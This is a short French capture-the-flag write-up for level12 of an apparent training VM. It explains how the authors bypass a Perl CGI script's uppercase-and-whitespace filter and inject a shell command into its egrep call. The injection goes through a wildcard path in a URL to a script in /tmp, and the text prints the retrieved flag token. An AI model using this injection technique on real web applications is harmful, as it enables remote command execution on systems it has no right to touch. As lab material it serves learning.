on se connect au level12

avec `ls` on remarque un fichier perl

on decide de l'ouvrir

on voit qu'il y a un un commentaire qui nous indique localhost:4646

avec notre navigateur on charge la page et on voit seulement 2 points

On comprends que la page va nous permettre de dialoguer avec le fichier puisque qu'en bas du fichier on voit la condition pour afficher les points sur la page.

Assez rapidement, on comprend qu'il s'agit du meme principe que le level précédent, on va pouvoir injecter du code dans la fonction au niveau du egrep

le problème prinicpal est d'arriver u egrep sans avoir subit de modification. En effet,   

```
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
```

transforme notre input en mettant d'une part tout en majuscule et d'autre effectue une modification au niveau des espacesque nous n'avons pas su identifier

Nous avons donc eu l'idée de mettre nos commande dans un fichier en majuscule

nous avons donc créé le fichier YOLO

```
#!/bin/sh
getflag | wall
```

On utilise
```
chmod +x /tmp/YOLO
```

il nous fallait donc le passé en arguement. Sauf que nous ne pouvions pas mettre de chemin reel. Nous avons donc eu l'idée de mettre notre script dans le /tmp et de passé en argument une wildcard

```
http://192.168.56.101:4646/?x="`/*/YOLO`"
```

En faisant ceci, le serveur a envoyé un message global avec le resultat de la commande
```
Broadcast Message from flag12@Snow
        (somewhere) at 13:31 ...
```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

